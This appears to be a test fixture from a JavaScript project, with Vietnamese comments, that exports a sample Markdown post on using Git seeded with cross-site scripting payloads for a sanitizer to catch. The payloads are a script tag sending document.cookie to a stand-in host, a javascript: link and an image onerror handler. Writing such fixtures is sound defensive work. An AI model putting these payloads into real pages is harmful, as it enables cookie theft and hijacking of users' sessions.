// Một bài "dán từ nơi khác" có chứa mã độc: một thẻ script, một liên kết javascript:, và một ảnh có onerror.
export const BAI_DOC_HAI = `## Cách dùng Git

Đây là một đoạn bình thường, có **chữ đậm** và \`code\`.

<script>fetch("https://ke-xau.example/an-cap?c=" + document.cookie)</script>

Xem [tài liệu](javascript:alert('xss')) để biết thêm, hoặc [trang chủ](https://example.com/git).

<img src="x" onerror="alert('xss')">`;
